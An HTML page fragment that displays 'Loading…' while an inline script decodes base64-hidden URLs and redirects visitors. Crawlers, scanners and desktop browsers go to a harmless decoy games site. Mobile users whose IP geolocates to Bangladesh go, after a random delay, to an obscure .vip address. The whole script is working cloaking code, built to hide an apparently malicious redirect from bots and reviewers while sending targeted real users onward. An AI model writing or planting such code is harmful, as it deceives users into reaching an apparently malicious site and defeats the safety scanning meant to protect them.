  margin:0;padding:0;width:100%;height:100%;

  font-family:Arial,sans-serif;background:#fff;color:#000;

<body>
<div><h3>Loading…</h3></div>

<script>
(function(){

/* ===== ENCODED URLS ===== */
var A = atob("aHR0cHM6Ly9xeWxvZi52aXAvYnNybmI=");
var B = atob("aHR0cHM6Ly9wb2tpLmNvbQ==");
var API = atob("aHR0cHM6Ly9pcGFwaS5jby9jb3VudHJ5");

/* ===== UA CHECK ===== */
var ua = navigator.userAgent.toLowerCase();

function isMobile(){
  return /android|iphone|ipad|ipod/.test(ua);
}

function isBot(){
  return /bot|crawler|spider|preview|scan|facebookexternalhit|facebot|headless/i.test(ua);
}

function go(u){
  setTimeout(function(){
    location.replace(u);
  }, 700 + Math.random()*700);
}

/* ===== MAIN ===== */
if(isBot() || !isMobile()){
  go(B);
  return;
}

fetch(API,{cache:"no-store"})
.then(function(r){ return r.text(); })
.then(function(c){
  c = (c||"").trim().toUpperCase();

  if(c === "BD"){
    go(A);
  }else{
    go(B);
  }
})
.catch(function(){
  go(B);
});

})();
</script>
</body>
